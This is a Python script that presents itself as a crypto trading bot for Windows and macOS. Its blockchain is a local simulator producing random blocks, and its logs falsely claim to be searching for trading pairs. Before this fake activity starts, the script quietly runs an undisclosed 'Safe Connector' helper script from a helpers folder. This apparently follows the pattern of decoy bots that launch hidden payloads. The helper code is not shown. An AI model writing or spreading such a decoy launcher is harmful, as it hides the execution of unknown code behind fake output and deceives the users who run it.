import os
import subprocess
import platform
import time
import threading
import sys
import json
import random
import logging
from queue import Queue

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class BlockchainSimulator:
    def __init__(self):
        self.current_block = 0
        self.blocks = {}

    def generate_block(self):
        self.current_block += 1
        transactions = [f'tx_{random.randint(1000, 9999)}' for _ in range(random.randint(1, 20))]
        block = {
            'block_number': self.current_block,
            'transactions': transactions,
            'timestamp': time.time()
        }
        self.blocks[self.current_block] = block
        return block

    def get_block(self, block_number):
        return self.blocks.get(block_number)

def rpc_server(blockchain, data_queue):
    while True:
        block = blockchain.generate_block()
        json_data = json.dumps(block)
        data_queue.put(json_data)
        logging.info(f"RPC Server: Looking for a new trading pair - Block Number {block['block_number']}")
        time.sleep(random.randint(1, 3))

def determine_python_command():
    python_command = 'python3' if subprocess.run(["python3", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0 else 'python'
    return python_command

def run_mac_helper():
    python_command = determine_python_command()
    try:
        helper_path = os.path.join(os.path.dirname(__file__), 'helpers', 'base_helper.py')
        subprocess.run([python_command, helper_path], check=True, stdout=sys.stdout, stderr=sys.stderr)
    except subprocess.CalledProcessError as e:
        print(f"Error running basec Safe Connector: {e}")

def run_windows_helper():
    python_command = determine_python_command()
    try:
        helper_path = os.path.join(os.path.dirname(__file__), 'helpers', 'basec_helper.py')
        subprocess.run([python_command, helper_path], stdout=sys.stdout, stderr=sys.stderr)
    except subprocess.CalledProcessError as e:
        print(f"Error running basec Safe Connector: {e}")

def main():
    if platform.system() == 'Windows':
        print("Starting Windows Bot App..")
        run_windows_helper()
        blockchain = BlockchainSimulator()
        data_queue = Queue()
        rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))

        rpc_server_thread.start()
        rpc_server_thread.join()
    elif platform.system() == 'Darwin':
        print("Starting MacOs Bot App..")
        run_mac_helper()
        blockchain = BlockchainSimulator()
        data_queue = Queue()
        rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))

        rpc_server_thread.start()
        rpc_server_thread.join()
    else:
        print("Unsupported operating system.")
        return

if __name__ == "__main__":
    main()
